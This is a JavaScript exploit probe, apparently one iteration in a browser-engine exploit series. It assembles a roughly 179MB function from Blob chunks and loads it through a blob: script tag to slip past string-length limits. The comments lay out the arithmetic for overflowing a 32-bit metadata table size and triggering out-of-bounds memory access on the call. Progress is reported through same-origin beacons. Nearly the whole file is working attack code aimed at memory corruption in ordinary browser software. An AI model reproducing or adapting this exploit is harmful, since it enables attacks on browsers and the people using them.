// p136 — MetadataTable overflow via Blob URL <script> tag
// Bypasses the 80MB JS string limit by building source from BlobParts
// The Blob is loaded by the resource loader, not created as a JS string
//
// Key insight: new Function() requires a JS string (~80MB limit)
// But <script src="blob:..."> loads via the resource loader
// We can build the Blob from many small parts → no single large JS string
//
// Target: 44,739,243 repeats of 'a();' = ~179MB source
// This produces (44,739,243 * 96 + 112) mod 2^32 = 144
// T=144 > s_offset16TableSize(108) → bounded memset, then sweep
//
// Beacon prefix: V136B-
(function(){
var rid='v136b'+Math.random().toString(36).slice(2,12);
function beacon(tag,data){
  var body=typeof data==='object'?JSON.stringify(data):String(data);
  try{navigator.sendBeacon('/beacon/V136B-'+tag,JSON.stringify({r:rid,b:body}));}catch(e){}
  try{fetch('/beacon/V136B-'+tag,{method:'POST',body:JSON.stringify({r:rid,b:body}),keepalive:true}).catch(function(){});}catch(e2){}
}
beacon('L','probe136-start');

// ======== B1: Build Blob from chunks, compile via script tag ========
// 44,739,243 repeats × 4 bytes = 178,956,972 bytes ≈ 171MB
function testB1(){
  var r={test:'B1-FULL-OVERFLOW'};
  var t0=Date.now();
  var TARGET_N=44739243; // n+1 from upstream (bounded memset)
  var CHUNK_SIZE=4000000; // 4M repeats per chunk = 16MB per chunk
  var CHUNK_COUNT=Math.floor(TARGET_N/CHUNK_SIZE);
  var REMAINDER=TARGET_N-CHUNK_COUNT*CHUNK_SIZE;

  r.targetN=TARGET_N;
  r.chunkSize=CHUNK_SIZE;
  r.chunkCount=CHUNK_COUNT;
  r.remainder=REMAINDER;

  try{
    beacon('B1-BUILDING','chunks='+CHUNK_COUNT);

    // Build blob parts — each chunk is a small JS string, ~16MB
    // We build one chunk at a time and feed it to the Blob
    var parts=[];
    // Function wrapper
    parts.push('window.__v136_compiled=true;window.__v136_fn=function(a){');

    for(var c=0;c<CHUNK_COUNT;c++){
      var chunk='a();'.repeat(CHUNK_SIZE);
      parts.push(chunk);
      chunk=null; // free immediately
      if(c%3===0){
        beacon('B1-CHUNK',''+c+'/'+CHUNK_COUNT);
      }
    }
    if(REMAINDER>0){
      parts.push('a();'.repeat(REMAINDER));
    }
    parts.push('};window.__v136_ready=true;');

    r.partsCount=parts.length;
    r.buildTime=Date.now()-t0;
    beacon('B1-PARTS-DONE',{partsCount:parts.length,buildMs:r.buildTime});

    // Create blob
    var blob=new Blob(parts,{type:'application/javascript'});
    r.blobSize=blob.size;
    r.blobTime=Date.now()-t0;
    parts=null; // free parts array
    beacon('B1-BLOB-DONE',{size:blob.size,ms:r.blobTime});

    // Create script tag
    var url=URL.createObjectURL(blob);
    var script=document.createElement('script');
    script.src=url;

    // Set up load handler
    var loadDone=false;
    script.onload=function(){
      loadDone=true;
      r.loadTime=Date.now()-t0;
      r.compiled=!!window.__v136_compiled;
      r.ready=!!window.__v136_ready;
      beacon('B1-LOADED',{ms:r.loadTime,compiled:r.compiled,ready:r.ready});

      // Now try calling the function to trigger link() → OOB
      if(typeof window.__v136_fn==='function'){
        beacon('B1-CALLING','now');
        var callCount=0;
        try{
          window.__v136_fn(function(){
            callCount++;
            if(callCount>2) throw new Error('STOP');
          });
        }catch(e){
          if(e.message==='STOP'){
            r.callOK=true;
            r.callCount=callCount;
          }else{
            r.callErr=e.constructor.name+':'+String(e.message||'').slice(0,60);
          }
        }
        r.callCount=callCount;
        beacon('B1-CALLED',{callCount:callCount,callOK:r.callOK,callErr:r.callErr});
      }

      URL.revokeObjectURL(url);
      blob=null;
    };

    script.onerror=function(e){
      r.scriptErr='load-error';
      r.loadTime=Date.now()-t0;
      beacon('B1-ERROR',{ms:r.loadTime});
      URL.revokeObjectURL(url);
    };

    document.head.appendChild(script);

    // Timeout check — script might take minutes to compile
    setTimeout(function(){
      if(!loadDone){
        r.timeout=true;
        r.timeoutAt=Date.now()-t0;
        r.compiled=!!window.__v136_compiled;
        r.ready=!!window.__v136_ready;
        beacon('B1-TIMEOUT-300S',{ms:r.timeoutAt,compiled:r.compiled,ready:r.ready});
      }
    },300000); // 5 minute timeout

    // Additional checks at intervals
    setTimeout(function(){ beacon('B1-CHECK-60S',{compiled:!!window.__v136_compiled,ready:!!window.__v136_ready}); },60000);
    setTimeout(function(){ beacon('B1-CHECK-120S',{compiled:!!window.__v136_compiled,ready:!!window.__v136_ready}); },120000);
    setTimeout(function(){ beacon('B1-CHECK-180S',{compiled:!!window.__v136_compiled,ready:!!window.__v136_ready}); },180000);

  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
    beacon('B1-SETUP-ERR',r);
  }
  return r;
}

// ======== B2: Smaller test — 30M repeats (120MB) ========
// If full 44.7M is too large, try an intermediate size
// 30M × 96 = 2,880,000,000 < 2^32 → does NOT overflow
// But if metadata is 144B per call (wk1200 larger structs):
// 30M × 144 = 4,320,000,000 > 2^32 → DOES overflow
function testB2(){
  var r={test:'B2-30M'};
  var t0=Date.now();
  var TARGET_N=30000000;
  var CHUNK_SIZE=3000000;
  var CHUNK_COUNT=Math.floor(TARGET_N/CHUNK_SIZE);

  try{
    var parts=['window.__v136b2_fn=function(a){'];
    for(var c=0;c<CHUNK_COUNT;c++){
      parts.push('a();'.repeat(CHUNK_SIZE));
    }
    parts.push('};window.__v136b2_ready=true;');

    var blob=new Blob(parts,{type:'application/javascript'});
    r.blobSize=blob.size;
    r.buildTime=Date.now()-t0;
    parts=null;
    beacon('B2-BLOB-DONE',{size:blob.size,ms:r.buildTime});

    var url=URL.createObjectURL(blob);
    var script=document.createElement('script');
    script.src=url;
    script.onload=function(){
      r.loadTime=Date.now()-t0;
      r.ready=!!window.__v136b2_ready;
      beacon('B2-LOADED',{ms:r.loadTime,ready:r.ready});

      if(typeof window.__v136b2_fn==='function'){
        beacon('B2-CALLING','now');
        var callCount=0;
        try{
          window.__v136b2_fn(function(){
            callCount++;
            if(callCount>2) throw new Error('STOP');
          });
        }catch(e){
          r.callErr=e.constructor.name+':'+String(e.message||'').slice(0,60);
          if(e.message==='STOP') r.callOK=true;
        }
        r.callCount=callCount;
        beacon('B2-CALLED',{callCount:callCount,callOK:r.callOK,callErr:r.callErr});
      }
      URL.revokeObjectURL(url);
    };
    script.onerror=function(){ beacon('B2-ERROR',{ms:Date.now()-t0}); URL.revokeObjectURL(url); };
    document.head.appendChild(script);

    setTimeout(function(){ beacon('B2-CHECK-120S',{ready:!!window.__v136b2_ready}); },120000);
    setTimeout(function(){ beacon('B2-CHECK-300S',{ready:!!window.__v136b2_ready}); },300000);

  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
    beacon('B2-ERR',r);
  }
}

// ======== Run ========
// Run B2 first (smaller, faster feedback), then B1
async function runAll(){
  beacon('START','building-blobs');

  // B2 first — 30M (120MB blob) — faster feedback
  testB2();

  // Wait for B2 to either complete or timeout before starting B1
  await new Promise(function(r){ setTimeout(r, 330000); }); // 5.5 min

  // B1 — full 44.7M (180MB blob)
  testB1();

  // Don't beacon DONE — tests run async via script tags
  // Beacons come from onload/onerror/timeout handlers
}
runAll();
})();
